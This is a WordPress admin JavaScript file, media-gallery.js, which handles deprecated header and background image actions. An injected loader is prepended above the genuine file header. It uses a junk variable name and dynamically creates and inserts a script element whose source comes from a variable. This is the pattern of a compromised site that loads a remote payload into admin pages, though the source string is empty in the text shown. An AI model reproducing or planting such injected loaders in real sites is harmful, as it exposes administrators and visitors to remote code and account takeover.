var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = ''; s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * This file is used on media-upload.php which has been replaced by media-new.php and upload.php
 *
 * @deprecated  3.5.0
 * @output wp-admin/js/media-gallery.js
 */

 /* global ajaxurl */
jQuery(function($) {
	/**
	 * Adds a click event handler to the element with a 'wp-gallery' class.
	 */
	$( 'body' ).bind( 'click.wp-gallery', function(e) {
		var target = $( e.target ), id, img_size;

		if ( target.hasClass( 'wp-set-header' ) ) {
			// Opens the image to preview it full size.
			( window.dialogArguments || opener || parent || top ).location.href = target.data( 'location' );
			e.preventDefault();
		} else if ( target.hasClass( 'wp-set-background' ) ) {
			// Sets the image as background of the theme.
			id = target.data( 'attachment-id' );
			img_size = $( 'input[name="attachments[' + id + '][image-size]"]:checked').val();

			/**
			 * This AJAX action has been deprecated since 3.5.0, see custom-background.php
			 */
			jQuery.post(ajaxurl, {
				action: 'set-background-image',
				attachment_id: id,
				size: img_size
			}, function() {
				var win = window.dialogArguments || opener || parent || top;
				win.tb_remove();
				win.location.reload();
			});

			e.preventDefault();
		}
	});
});
